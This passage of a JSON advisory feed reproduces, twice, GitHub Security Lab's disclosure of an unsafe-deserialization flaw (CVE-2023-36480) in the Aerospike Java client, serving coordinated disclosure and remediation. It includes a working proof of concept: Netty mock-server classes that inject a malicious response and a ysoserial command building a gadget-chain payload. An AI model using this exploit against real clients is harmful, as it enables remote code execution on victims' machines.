20);\n    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;\n\n    if (resultCode == 0) {\n        // --snip--\n        skipKey(fieldCount);\n        record = parseRecord(opCount, generation, expiration, isOperation);\n        return true;\n    }\n</code></pre>\n<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083\"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>\n<pre><code class=\"language-java\">protected final Record parseRecord(\n    int opCount,\n    int generation,\n    int expiration,\n    boolean isOperation\n)  {\n    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();\n\n    for (int i = 0 ; i &lt; opCount; i++) {\n        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);\n        byte particleType = dataBuffer[dataOffset + 5];\n        byte nameSize = dataBuffer[dataOffset + 7];\n        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);\n        dataOffset += 4 + 4 + nameSize;\n\n        int particleBytesSize = opSize - (4 + nameSize);\n        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);\n</code></pre>\n<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53\"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>\n<pre><code class=\"language-java\">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)\n    throws AerospikeException {\n        switch (type) {\n            // --snip--\n            case ParticleType.JBLOB:\n                return Buffer.bytesToObject(buf, offset, len);\n</code></pre>\n<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300\"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>\n<pre><code class=\"language-java\">public static Object bytesToObject(byte[] buf, int offset, int length) {\n    // --snip--\n    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {\n        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n            return oistream.readObject();\n        }\n    }\n    // --snip--\n}\n</code></pre>\n<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227\"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>\n<pre><code class=\"language-java\">private T unpackBlob(int count) throws IOException, ClassNotFoundException {\n    // --snip--\n    case ParticleType.JBLOB:\n        // --snip--\n        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {\n            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n                val = getJavaBlob(oistream.readObject());\n            }\n        }\n</code></pre>\n<p>This vulnerability was discovered with the help of <a href=\"https://codeql.github.com/\">CodeQL</a>.</p>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>\n<h4 id=\"remediation\">Remediation</h4>\n<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>\n<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>\n<h4 id=\"resources\">Resources</h4>\n<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>\n<pre><code class=\"language-java\">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {\n        // --snip--\n        if (s.getBytes()[7] == 0x44) {\n            AttackMessage m = new AttackMessage(\n                    Files.readAllBytes(Paths.get(\"location/of/deserialization/payload.bin\")));\n            ctx.channel().writeAndFlush(m);\n            return;\n        }\n        // --snip--\n    }\n}\n</code></pre>\n<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>\n<pre><code class=\"language-java\">public class AttackMessage {\n\n    private byte resultCode = 0;\n    private int generation = 2;\n    private int expiration = 417523457;\n    private short fieldCount = 0;\n    private short opCount = 1;\n    private byte particleType = 7;\n    private String name = \"putgetbin\";\n    private byte[] payload;\n\n    public AttackMessage(byte[] payload) {\n        this.payload = payload;\n    }\n\n    // --snip-- (getters)\n\n    public int[] getSize() {\n        int size = 30 + name.length() + payload.length;\n        int low = (byte) (size &amp; 0xFF);\n        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;\n        return new int[] {high, low};\n    }\n\n    public int getOpSize() {\n        return payload.length + 4 + name.length();\n    }\n\n    public byte[] getPayload() {\n        return payload;\n    }\n}\n</code></pre>\n<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>\n<pre><code class=\"language-java\">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {\n\n    @Override\n    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)\n            throws Exception {\n        // header\n        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});\n        int[] length = msg.getSize();\n        out.writeByte(length[0]);\n        out.writeByte(length[1]);\n\n        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});\n        out.writeByte(msg.getResultCode());\n        out.writeInt(msg.getGeneration());\n        out.writeInt(msg.getExpiration());\n\n        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});\n        out.writeShort(msg.getFieldCount());\n        out.writeShort(msg.getOpCount());\n        out.writeInt(msg.getOpSize());\n\n        out.writeByte(0x01);\n        out.writeByte(msg.getParticleType());\n\n        out.writeByte(0x00);\n        out.writeByte(msg.getName().length());\n        out.writeCharSequence(msg.getName(), Charset.defaultCharset());\n        out.writeBytes(msg.getPayload());\n    }\n\n}\n</code></pre>\n<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>\n<pre><code class=\"language-xml\">&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;\n  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;\n  &lt;version&gt;4.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>In which case, the malicious payload file could be generated using <a href=\"https://github.com/frohoff/ysoserial\"><code>ysoserial</code></a> as follows:</p>\n<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin\n</code></pre>\n<h2 id=\"github-security-advisories\">GitHub Security Advisories</h2>\n<p>We recommend you create a private <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory\">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory\">published</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was discovered and reported by the GitHub CodeQL team members <a href=\"https://github.com/atorralba\">@atorralba (Tony Torralba)</a> and <a href=\"https://github.com/joefarebrother\">@joefarebrother (Joseph Farebrother)</a>.</p>\n<h2 id=\"contact\">Contact</h2>\n<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>\n<h2 id=\"disclosure-policy\">Disclosure Policy</h2>\n<p>This report is subject to our <a href=\"https://securitylab.github.com/advisories#policy\">coordinated disclosure policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597\">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900\">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36480\">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>\n<li><a href=\"https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses\">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a\">https://github.com/aerospike/aerospike-client-java/commit/02bf28e62fb186f004c82c87b219db2fc5b8262a</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae\">https://github.com/aerospike/aerospike-client-java/commit/51c65e32837da29435161a2d9c09bbdc2071ecae</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36\">https://github.com/aerospike/aerospike-client-java/commit/66aafb4cd743cf53baffaeaf69b035f51d2e2e36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj95-55cr-9597\">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj95-55cr-9597",
            "title": "[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses",
            "date_modified": "2023-08-08T14:55:46.000Z",
            "date_published": "2023-08-03T19:45:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj95-55cr-9597"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"github-security-lab-ghsl-vulnerability-report-ghsl-2023-044\">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>\n<p>The <a href=\"https://securitylab.github.com\">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href=\"https://github.com/aerospike/aerospike-client-java/\">Aerospike Java Client</a>.</p>\n<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>\n<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>\n<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>\n<h2 id=\"summary\">Summary</h2>\n<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>\n<h2 id=\"product\">Product</h2>\n<p>Aerospike Java Client</p>\n<h2 id=\"tested-version\">Tested Version</h2>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7\">6.1.7</a></p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"issue-unsafe-deserialization-of-server-responses-ghsl-2023-044\">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>\n<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157\"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>\n<pre><code class=\"language-java\">@Override\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    command.read((ByteBuf)msg);\n}\n</code></pre>\n<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code â€” for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489\"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>\n<pre><code class=\"language-java\">private void read(ByteBuf byteBuffer) {\n    eventReceived = true;\n\n    try {\n        switch (state) {\n            // --snip--\n            case AsyncCommand.COMMAND_READ_HEADER:\n                if (command.isSingle) {\n                    readSingleHeader(byteBuffer);\n                }\n                // --snip--\n        }\n        // --snip--\n    }\n    // --snip---\n}\n</code></pre>\n<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596\"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>\n<pre><code class=\"language-java\">private void readSingleHeader(ByteBuf byteBuffer) {\n    int readableBytes = byteBuffer.readableBytes();\n    int dataSize = command.dataOffset + readableBytes;\n\n    // --snip--\n\n    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);\n    command.dataOffset = dataSize;\n\n    if (command.dataOffset &gt;= receiveSize) {\n        parseSingleBody();\n    }\n}\n</code></pre>\n<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68\"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>\n<pre><code class=\"language-java\">@Override\nprotected final boolean parseResult() {\n    validateHeaderSize();\n\n    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;\n    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);\n    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);\n    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);\n    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);\n    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;\n\n    if (resultCode == 0) {\n        // --snip--\n        skipKey(fieldCount);\n        record = parseRecord(opCount, generation, expiration, isOperation);\n        return true;\n    }\n</code></pre>\n<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083\"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>\n<pre><code class=\"language-java\">protected final Record parseRecord(\n    int opCount,\n    int generation,\n    int expiration,\n    boolean isOperation\n)  {\n    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();\n\n    for (int i = 0 ; i &lt; opCount; i++) {\n        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);\n        byte particleType = dataBuffer[dataOffset + 5];\n        byte nameSize = dataBuffer[dataOffset + 7];\n        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);\n        dataOffset += 4 + 4 + nameSize;\n\n        int particleBytesSize = opSize - (4 + nameSize);\n        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);\n</code></pre>\n<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53\"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>\n<pre><code class=\"language-java\">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)\n    throws AerospikeException {\n        switch (type) {\n            // --snip--\n            case ParticleType.JBLOB:\n                return Buffer.bytesToObject(buf, offset, len);\n</code></pre>\n<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300\"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>\n<pre><code class=\"language-java\">public static Object bytesToObject(byte[] buf, int offset, int length) {\n    // --snip--\n    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {\n        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n            return oistream.readObject();\n        }\n    }\n    // --snip--\n}\n</code></pre>\n<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227\"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>\n<pre><code class=\"language-java\">private T unpackBlob(int count) throws IOException, ClassNotFoundException {\n    // --snip--\n    case ParticleType.JBLOB:\n        // --snip--\n        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {\n            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n                val = getJavaBlob(oistream.readObject());\n            }\n        }\n</code></pre>\n<p>This vulnerability was discovered with the help of <a href=\"https://codeql.github.com/\">CodeQL</a>.</p>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>\n<h4 id=\"remediation\">Remediation</h4>\n<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>\n<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>\n<h4 id=\"resources\">Resources</h4>\n<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>\n<pre><code class=\"language-java\">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {\n        // --snip--\n        if (s.getBytes()[7] == 0x44) {\n            AttackMessage m = new AttackMessage(\n                    Files.readAllBytes(Paths.get(\"location/of/deserialization/payload.bin\")));\n            ctx.channel().writeAndFlush(m);\n            return;\n        }\n        // --snip--\n    }\n}\n</code></pre>\n<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>\n<pre><code class=\"language-java\">public class AttackMessage {\n\n    private byte resultCode = 0;\n    private int generation = 2;\n    private int expiration = 417523457;\n    private short fieldCount = 0;\n    private short opCount = 1;\n    private byte particleType = 7;\n    private String name = \"putgetbin\";\n    private byte[] payload;\n\n    public AttackMessage(byte[] payload) {\n        this.payload = payload;\n    }\n\n    // --snip-- (getters)\n\n    public int[] getSize() {\n        int size = 30 + name.length() + payload.length;\n        int low = (byte) (size &amp; 0xFF);\n        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;\n        return new int[] {high, low};\n    }\n\n    public int getOpSize() {\n        return payload.length + 4 + name.length();\n    }\n\n    public byte[] getPayload() {\n        return payload;\n    }\n}\n</code></pre>\n<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>\n<pre><code class=\"language-java\">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {\n\n    @Override\n    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)\n            throws Exception {\n        // header\n        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});\n        int[] length = msg.getSize();\n        out.writeByte(length[0]);\n        out.writeByte(length[1]);\n\n        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});\n        out.writeByte(msg.getResultCode());\n        out.writeInt(msg.getGeneration());\n        out.writeInt(msg.getExpiration());\n\n        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});\n        out.writeShort(msg.getFieldCount());\n        out.writeShort(msg.getOpCount());\n        out.writeInt(msg.getOpSize());\n\n        out.writeByte(0x01);\n        out.writeByte(msg.getParticleType());\n\n        out.writeByte(0x00);\n        out.writeByte(msg.getName().length());\n        out.writeCharSequence(msg.getName(), Charset.defaultCharset());\n        out.writeBytes(msg.getPayload());\n    }\n\n}\n</code></pre>\n<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>\n<pre><code class=\"language-xml\">&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;\n  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;\n  &lt;version&gt;4.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>In which case, the malicious payload file could be generated using <a href=\"https://github.com/frohoff/ysoserial\"><code>ysoserial</code></a> as follows:</p>\n<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin\n</code></pre>\n<h2 id=\"github-security-advisories\">GitHub Security Advisories</h2>\n<p>We recommend you create a private <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory\">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory\">published</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was discovered and reported by the GitHub CodeQL team members <a href=\"https://github.com/atorralba\">@atorralba (Tony Torralba)</a> and <a href=\"https://github.com/joefarebrother\">@joefarebrother (Joseph Farebrother)</a>.</p>\n<h2 id=\"contact\">Contact</h2>\n<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>\n<h2 id=\"disclosure-policy\">Disclosure Policy</h2>\n<p>This report is subject to our <a href=\"https://securitylab.github.com/advisories#policy\">coordinated disclosure policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597\">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900\">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36480\">https://nvd.nist.gov/vuln/detail/CVE-2023-36480</a></li>\n<li><a href=\"https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses\">https://support.aerospike.com/s/article/CVE-2023-36480-Aerospike-Java-Client-vulnerable-to-unsafe-deserialization-of-server-responses</a></li>\n<li><a 